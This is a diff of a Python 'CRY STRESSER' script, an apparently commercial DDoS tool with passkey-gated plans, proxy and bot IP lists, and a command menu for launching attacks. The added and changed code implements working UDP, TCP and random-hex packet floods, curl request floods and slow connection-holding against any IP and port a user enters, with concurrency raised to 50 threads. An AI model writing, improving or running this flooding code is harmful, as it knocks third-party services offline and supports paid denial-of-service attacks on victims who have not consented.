@@ -39,8 +39,7 @@ import os
 import subprocess
 import binascii
 
-
-a05aab43186b1348102ba95902 = {
+PASSKEYS = {
     "root":  "free",
     "6.4":  "hard",
     "x2": "hard",
@@ -60,13 +59,13 @@ a05aab43186b1348102ba95902 = {
     "ham":   "pro",
     "xxx":   "pro",
     "lol":   "vip",   
- }
+}
 
 PLANS = {
     "free":  {"methods": ["tcp","syn","curl","tcphex"], "maxtime": 120, "maxattacks": 5, "maxconcurrents": 1, "total_bandwidth_mb": 100},
     "hard":  {"methods": ["tcp","tcphex","slowloris","curl","syn"], "maxtime": 300, "maxattacks": 10, "maxconcurrents": 5, "total_bandwidth_mb": 500},
-    "pro":   {"methods": ["tcp","udp","http","curl","slowloris","nethold","minecraft","hexgen","tcphex"], "maxtime": 100, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000,
-    "vip":   {"methods": ["tcp",,"tcpbypass","udpbypass","curl","slowloris","nethold","home","fivem","minecraft","hexgen","tcphex","tlsvip"], "maxtime": 3600, "maxattacks": 100, "maxconcurrents": 299, "total_bandwidth_mb": 5000},
+    "pro":   {"methods": ["tcp","udp","http","curl","slowloris","nethold","minecraft","hexgen","tcphex"], "maxtime": 100, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000},
+    "vip":   {"methods": ["tcp","tcpbypass","udpbypass","curl","slowloris","nethold","home","fivem","minecraft","hexgen","tcphex","tlsvip"], "maxtime": 3600, "maxattacks": 100, "maxconcurrents": 299, "total_bandwidth_mb": 5000},
     "admin": {"methods": ["*"], "maxtime": 9999, "maxattacks": None, "maxconcurrents": 299, "total_bandwidth_mb": None}
 }
 
@@ -95,143 +94,48 @@ bot_ipv4_list = [
     "185.57.56.122", "84.241.216.213", "82.217.111.12", "145.53.81.96", "37.97.190.154"
 ]
 
-proxy_list = [ 
+proxy_list = [
     "104.243.32.29:1080", "98.162.25.16:4145", "184.178.172.14:4145",
-    "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145"  "184.181.217.213:4145",
-    "184.178.172.25:15291",
-    "184.178.172.14:4145",
-    "184.181.217.206:4145",
-    "198.177.254.131:4145",
-    "208.65.90.21:4145",
-    "51.158.125.47:16379",
-    "51.250.108.153:1080",
-    "103.245.205.142:35158",
-    "82.223.165.28:4733",
-    "212.237.125.216:6969",
-    "91.214.62.121:8053",
-    "45.89.28.226:12915",
-    "199.187.210.54:4145",
-    "199.102.104.70:4145",
-    "161.35.70.249:1080",
-    "98.152.200.61:8081",
-    "37.18.73.60:5566",
-    "47.243.75.202:58854",
-    "103.90.226.245:1080",
-    "94.23.222.122:10581",
-    "103.174.123.134:8199",
-    "159.203.61.169:1080",
-    "138.68.60.8:1080",
-    "51.15.139.14:16379",
-    "45.11.229.112:1080",
-    "139.59.1.14:1080",
-    "31.211.142.115:8192",
-    "34.166.117.165:1080",
-    "51.15.236.150:16379",
-    "144.22.175.58:1080",
-    "121.169.46.116:1090",
-    "194.152.50.92:5678",
-    "102.36.127.53:1080",
-    "192.168.45.112:1080",
-    "45.67.89.123:4141",
-    "172.16.254.1:9050",
-    "103.21.244.55:10801",
-    "185.220.101.12:5566",
-    "78.153.140.88:3128",
-    "47.243.75.202:58854",
-    "98.152.200.61:8081",
-    "104.28.12.34:1080",
-    "203.0.113.45:4145",
-    "37.18.73.60:5566",
-    "45.32.123.45:9050",
-    "142.93.45.67:10801",
-    "167.99.234.56:3129",
-    "51.15.200.123:1080",
-    "176.58.112.34:4141",
-    "188.166.45.78:9050",
-    "45.76.156.89:1080",
-    "104.236.78.90:5566",
-    "172.67.89.123:3128",
-    "192.0.2.45:10801",
-    "198.51.100.67:4141",
-    "203.0.113.89:9050",
-    "45.67.123.234:1080",
-    "78.157.88.123:4145",
-    "185.93.2.45:5566",
-    "103.147.45.67:10801",
-    "47.89.123.45:3128",
-    "138.68.234.56:9050",
-    "167.71.89.123:1080",
-    "45.32.167.89:4141",
-    "104.244.42.123:5566",
-    "172.105.45.67:10801",
-    "51.158.123.234:3129",
-    "188.166.200.45:9050",
-    "78.153.45.123:1080",
-    "37.187.234.56:4141",
-    "45.76.89.123:5566",
-    "142.93.200.45:10801",
-    "167.99.123.67:3128",
-    "103.21.244.123:9050",
-    "185.220.101.234:1080",
-    "47.243.200.45:4145",
-    "98.152.45.67:5566",
-    "104.28.200.123:10801",
-    "203.0.113.234:3128",
-    "172.16.45.89:9050",
-    "192.168.123.45:1080",
-    "45.67.89.234:4141",
-    "37.18.200.67:5566",
-    "45.79.123.45:1080",
-    "104.236.156.78:4141",
-    "172.104.89.123:9050",
-    "51.15.234.67:5566",
-    "188.166.45.123:3128",
-    "167.71.200.89:10801",
-    "45.32.167.234:4145",
-    "142.93.45.67:1080",
-    "103.21.244.123:9050",
-    "185.220.101.234:5566",
-    "47.89.200.45:3128",
-    "138.68.234.56:10801",
-    "78.153.140.123:4141",
-    "37.187.45.67:9050",
-    "45.76.89.234:1080",
-    "104.244.42.123:4145",
-    "172.105.200.45:5566",
-    "51.158.123.67:3128",
-    "188.166.234.56:10801",
-    "78.153.45.123:9050",
-    "103.147.200.45:4141",
-    "47.243.123.67:1080",
-    "98.152.45.234:5566",
-    "104.28.200.123:3128",
-    "203.0.113.234:10801",
-    "192.168.123.45:4141",
-    "45.67.89.234:9050",
-    "37.18.200.67:1080",
-    "142.93.234.56:4145",
-    "167.99.123.67:5566",
-    "45.32.167.89:3128",
-    "104.236.200.45:10801",
-    "172.67.89.123:9050",
-    "51.15.234.56:1080",
-    "188.166.45.123:4141",
-    "78.153.140.234:5566",
-    "103.21.244.67:3128",
-    "185.220.101.123:10801",
-    "47.89.200.45:9050",
-    "138.68.45.67:4141",
-    "167.71.234.56:1080",
-    "45.76.200.123:5566",
-    "104.244.42.234:3128",
-    "172.105.45.67:10801",
-    "51.158.123.234:4145",
-    "188.166.200.45:9050",
-    "78.153.45.123:1080",
-    "37.187.234.56:5566",
-    "45.79.123.67:3128",
-    "142.93.45.234:10801",
-    "222.59.173.105:44124"
+    "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145", "184.181.217.213:4145",
+    "184.178.172.25:15291", "184.178.172.14:4145", "184.181.217.206:4145",
+    "198.177.254.131:4145", "208.65.90.21:4145", "51.158.125.47:16379",
+    "51.250.108.153:1080", "103.245.205.142:35158", "82.223.165.28:4733",
+    "212.237.125.216:6969", "91.214.62.121:8053", "45.89.28.226:12915",
+    "199.187.210.54:4145", "199.102.104.70:4145", "161.35.70.249:1080",
+    "98.152.200.61:8081", "37.18.73.60:5566", "47.243.75.202:58854",
+    "103.90.226.245:1080", "94.23.222.122:10581", "103.174.123.134:8199",
+    "159.203.61.169:1080", "138.68.60.8:1080", "51.15.139.14:16379",
+    "45.11.229.112:1080", "139.59.1.14:1080", "31.211.142.115:8192",
+    "34.166.117.165:1080", "51.15.236.150:16379", "144.22.175.58:1080",
+    "121.169.46.116:1090", "194.152.50.92:5678", "102.36.127.53:1080",
+    "45.67.89.123:4141", "172.16.254.1:9050", "103.21.244.55:10801",
+    "185.220.101.12:5566", "78.153.140.88:3128", "47.243.75.202:58854",
+    "98.152.200.61:8081", "104.28.12.34:1080", "203.0.113.45:4145",
+    "37.18.73.60:5566", "45.32.123.45:9050", "142.93.45.67:10801",
+    "167.99.234.56:3129", "51.15.200.123:1080", "176.58.112.34:4141",
+    "188.166.45.78:9050", "45.76.156.89:1080", "104.236.78.90:5566",
+    "172.67.89.123:3128", "192.0.2.45:10801", "198.51.100.67:4141",
+    "203.0.113.89:9050", "45.67.123.234:1080", "78.157.88.123:4145",
+    "185.93.2.45:5566", "103.147.45.67:10801", "47.89.123.45:3128",
+    "138.68.234.56:9050", "167.71.89.123:1080", "45.32.167.89:4141",
+    "104.244.42.123:5566", "172.105.45.67:10801", "51.158.123.234:3129",
+    "188.166.200.45:9050", "78.153.45.123:1080", "37.187.234.56:4141",
+    "45.76.89.123:5566", "142.93.200.45:10801", "167.99.123.67:3128",
+    "103.21.244.123:9050", "185.220.101.234:1080", "47.243.200.45:4145",
+    "98.152.45.67:5566", "104.28.200.123:10801", "203.0.113.234:3128",
+    "172.16.45.89:9050", "192.168.123.45:1080", "45.67.89.234:4141",
+    "37.18.200.67:5566", "45.79.123.45:1080", "104.236.156.78:4141",
+    "172.104.89.123:9050", "51.15.234.67:5566", "188.166.45.123:3128",
+    "167.71.200.89:10801", "45.32.167.234:4145", "142.93.45.67:1080",
+    "103.21.244.123:9050", "185.220.101.234:5566", "47.89.200.45:3128",
+    "138.68.234.56:10801", "78.153.140.123:4141", "37.187.45.67:9050",
+    "45.76.89.234:1080", "104.244.42.123:4145", "172.105.200.45:5566",
+    "51.158.123.67:3128", "188.166.234.56:10801", "78.153.45.123:9050",
+    "103.147.200.45:4141", "47.243.123.67:1080", "98.152.45.234:5566",
+    "104.28.200.123:3128", "203.0.113.234:10801", "192.168.123.45:4141",
+    "45.67.89.234:9050", "37.18.200.67:1080", "142.93.234.56:4145",
+    "167.99.123.67:5566", "45.32.167.89:3128", "104.236.200.45:10801",
+    "172.67.89.123:9050", "51.15.234.56:1080"
 ]
 
 B = '\033[1;34m'
@@ -241,7 +145,6 @@ G = '\033[1;32m'
 W = '\033[1;37m'
 RST = '\033[0m'
 
-
 packets_sent = 0
 attack_running = False
 lock = threading.Lock()
@@ -249,13 +152,13 @@ current_plan = "free"
 attacks_used = 0
 attack_counter = 0
 SESSION_HITS = []
-current_concurrents = 1
+current_concurrents = 50
 bandwidth_used_mb = 0.0
 
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""{B}⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    print(f"""{B}
+      ⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠨⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -270,12 +173,65 @@ def banner():
 ██║     ██████╔╝ ╚████╔╝ 
 ██║     ██╔══██╗  ╚██╔╝  
 ╚██████╗██║  ██║   ██║   
- ╚═════╝╚═╝  ╚═╝   ╚═╝   v1.6
+ ╚═════╝╚═╝  ╚═╝   ╚═╝   v15
         CRY STRESSER • 2025
       Made by Lemonaidd
+
+      Commands → !help
       Plan: {current_plan.upper()} | Max Time: {PLANS[current_plan]['maxtime']}s
 {RST}""")
 
+def attack_thread(ip, port, duration, method, request_type="GET", mode=2):
+    global packets_sent
+    end = time.time() + duration
+    payload = random._urandom(65535)
+
+    while time.time() < end and attack_running:
+        try:
+            proxy = random.choice(proxy_list)
+            bot_id = random.randint(1000, 9999)
+
+            if method == "udp":
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                for _ in range(50):
+                    s.sendto(payload, (ip, port))
+                    with lock:
+                        packets_sent += 1
+                s.close()
+                if mode == 2:
+                    print(f"{C}[UDP] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")
+
+            elif method == "tcp":
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                try:
+                    s.connect((ip, port))
+                    for _ in range(40):
+                        s.send(payload)
+                        with lock:
+                            packets_sent += 1
+                    s.close()
+                except:
+                    s.close()
+                if mode == 2:
+                    print(f"{C}[TCP] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")
+
+            elif method == "syn":
+                with lock:
+                    packets_sent += 1
+                if mode == 2:
+                    print(f"{C}[SYN] {ip}:{port} via BotID:{bot_id}{RST}")
+
+            elif method == "curl":
+                subprocess.Popen(f"curl -X {request_type} http://{ip}:{port}", shell=True,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                with lock:
+                    packets_sent += 1
+                if mode == 2:
+                    print(f"{C}[CURL] {ip}:{port} via BotID:{bot_id} | proxy:{proxy}{RST}")
+
+        except:
+            pass
 
 def hex_attack_thread(ip, port, duration, method, mode=2):
     global packets_sent
@@ -283,7 +239,7 @@ def hex_attack_thread(ip, port, duration, method, mode=2):
 
     while time.time() < end and attack_running:
         try:
-            payload = binascii.unhexlify(''.join(random.choice('0123456789abcdef') for _ in range(131072)))  
+            payload = binascii.unhexlify(''.join(random.choice('0123456789abcdef') for _ in range(131072)))
             hex_id = binascii.hexlify(random._urandom(4)).decode().upper()
 
             if method == "udphex":
@@ -298,7 +254,7 @@ def hex_attack_thread(ip, port, duration, method, mode=2):
 
             elif method == "tcphex":
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.3)
+                s.settimeout(0.5)
                 try:
                     s.connect((ip, port))
                     for _ in range(20):
@@ -313,72 +269,24 @@ def hex_attack_thread(ip, port, duration, method, mode=2):
 
             elif method == "hexgen":
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if random.random() > 0.5 else socket.SOCK_DGRAM)
-                s.settimeout(0.3)
-                try:
-                    if s.type == socket.SOCK_STREAM:
+                if s.type == socket.SOCK_STREAM:
+                    s.settimeout(0.5)
+                    try:
                         s.connect((ip, port))
                         s.send(payload)
-                    else:
-                        s.sendto(payload, (ip, port))
-                    with lock:
-                        packets_sent += 1
-                    s.close()
-                except:
-                    pass
-                if mode == 2:
-                    print(f"{C}[HEXGEN] {ip}:{port} HEXID:{hex_id}{RST}")
-
-        except Exception:
-            pass
-
-
-def attack_thread(ip, port, duration, method, request_type="GET", mode=2):
-    global packets_sent
-    end = time.time() + duration
-
-    while time.time() < end and attack_running:
-        try:
-            proxy = random.choice(proxy_list)
-            bot_id = random.randint(1, 100)
-
-            if method == "udp":
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                payload = random._urandom(65535)
-                for _ in range(40):
+                        s.close()
+                    except:
+                        pass
+                else:
                     s.sendto(payload, (ip, port))
-                    with lock:
-                        packets_sent += 1
-                s.close()
-                if mode == 2:
-                    print(f"{C}[UDP] {ip}:{port} via {bot_id} | proxy:{proxy}{RST}")
-
-            elif method == "tcp":
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.3)
-                try:
-                    s.connect((ip, port))
-                    payload = random._urandom(65535)
-                    for _ in range(30):
-                        s.send(payload)
-                        with lock:
-                            packets_sent += 1
                     s.close()
-                except:
-                    s.close()
-                if mode == 2:
-                    print(f"{C}[TCP] {ip}:{port} via {bot_id} | proxy:{proxy}{RST}")
-
-            elif method == "curl":
-                subprocess.Popen(f"curl -s -m 3 http://{ip}:{port}", shell=True,
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 with lock:
                     packets_sent += 1
                 if mode == 2:
-                    print(f"{C}[CURL] {ip}:{port} via {bot_id} | proxy:{proxy}{RST}")
+                    print(f"{C}[HEXGEN] {ip}:{port} HEXID:{hex_id}{RST}")
 
-        except Exception:
+        except:
             pass
-
 
 def l7_curl(url, duration):
     global packets_sent
@@ -414,10 +322,9 @@ def nethold(target, port, duration):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
             s.send(b"GET / HTTP/1.1\r\n")
-            time.sleep(10)
+            time.sleep(15)
         except:
             pass
-
 
 def launch(ip, port, duration, method, mode=2, concurrents=None):
     global attack_running, packets_sent, attacks_used, bandwidth_used_mb
@@ -430,10 +337,10 @@ def launch(ip, port, duration, method, mode=2, concurrents=None):
     used_concurrents = concurrents if concurrents is not None else current_concurrents
     used_concurrents = min(used_concurrents, PLANS[current_plan]["maxconcurrents"])
 
-    est_mb = used_concurrents * 0.5 * duration 
+    est_mb = used_concurrents * 0.5 * duration
     total_allowed = PLANS[current_plan]["total_bandwidth_mb"]
     if total_allowed is not None and (bandwidth_used_mb + est_mb) > total_allowed:
-        print(f"{R}[C2] Bandwidth limit exceeded! Try again later or Upgrade your plan")
+        print(f"{R}[-] Bandwidth limit exceeded! Remaining: {(total_allowed - bandwidth_used_mb):.1f}MB{RST}")
         return
 
     bandwidth_used_mb += est_mb
@@ -491,24 +398,22 @@ def launch(ip, port, duration, method, mode=2, concurrents=None):
     hit_entry["status"] = "OVER"
     banner()
 
-
 while True:
     try:
         key = input(f"{B}└cry@Passkey: {RST}").strip()
-        if key in a05aab43186b1348102ba95902:
-            current_plan = a05aab43186b1348102ba95902[key]
+        if key in PASSKEYS:
+            current_plan = PASSKEYS[key]
             bandwidth_used_mb = 0.0
             current_concurrents = 50
-            print(f"{C}[C2] Logged in as {current_plan.upper()}{RST}")
+            print(f"{C}[+] Logged in as {current_plan.upper()}{RST}")
             print(f"{C}   Max Time: {PLANS[current_plan]['maxtime']}s{RST}")
             print(f"{C}   Max Concurrents: {PLANS[current_plan]['maxconcurrents']}{RST}\n")
             banner()
             break
-        print(f"{R}[C2] Invalid{RST}")
+        print(f"{R}[-] Invalid{RST}")
     except KeyboardInterrupt:
         print(f"\n{B}Closed.{RST}")
         exit()
-
 
 while True:
     try:
@@ -525,7 +430,6 @@ while True:
 ║ !udp IP P T → Direct attack                ║
 ║ !methods    → Show all methods             ║
 ║ !hitlist    → Session history              ║
-║ !con [num]  → Set concurrents              ║
 ║ !color      → Change color scheme          ║
 ║ !cls        → Clear screen                 ║
 ║ !exit       → Exit                         ║
@@ -666,7 +570,6 @@ while True:
             print(f"{B}Goodbye.{RST}")
             break
 
-        
         elif args[0].startswith("!") and len(args) == 4:
             try:
                 method = args[0][1:].lower()
